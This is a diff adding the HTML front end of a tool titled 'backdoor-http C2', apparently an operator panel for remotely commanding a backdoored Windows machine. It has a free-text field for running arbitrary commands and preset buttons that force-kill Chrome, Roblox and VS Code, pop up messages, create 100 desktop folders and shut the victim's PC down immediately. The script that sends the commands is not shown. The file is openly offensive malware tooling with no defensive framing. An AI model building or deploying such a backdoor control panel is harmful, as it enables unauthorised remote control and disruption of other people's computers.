@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>backdoor-http</title>
+    <link rel="stylesheet" href="./assets/styles.css" />
+    <script src="./scripts/main.js" defer></script>
+  </head>
+  <body>
+    <aside>
+      <h2 translate="no">Recipes <span>windows-only</span></h2>
+      <div>
+        <button data-cmd="taskkill /F /IM chrome.exe">
+          Close google chrome
+        </button>
+        <button data-cmd="start chrome">
+          Open google chrome
+        </button>
+        <button data-cmd="start calc">
+          Open calculator
+        </button>
+        <button data-cmd="taskkill /F /IM RobloxPlayerBeta.exe">
+          Close roblox
+        </button>
+        <button data-cmd="code">
+          Open vscode
+        </button>
+        <button data-cmd="taskkill /F /IM Code.exe">
+          Close vscode
+        </button>
+        <button data-cmd="msg * HELLO, WORLD!">
+          Send HELLO, WORLD!
+        </button>
+        <button data-cmd="for /l %i in (1,1,100) do mkdir %USERPROFILE%/Desktop/folder%i">
+          Create 100 folders
+        </button>
+        <button data-cmd="shutdown /s /t 0">
+          Turn off pc
+        </button>
+      </div>
+    </aside>
+    <main>
+      <h1>backdoor-http C2</h1>
+      <div>
+        <form>
+          <input
+            type="text"
+            name="command"
+            placeholder="Type your command..."
+            required
+          />
+          <button type="submit" translate="no">run</button>
+        </form>
+        <textarea style="resize: none" disabled translate="no"></textarea>
+      </div>
+    </main>
+  </body>
+</html>
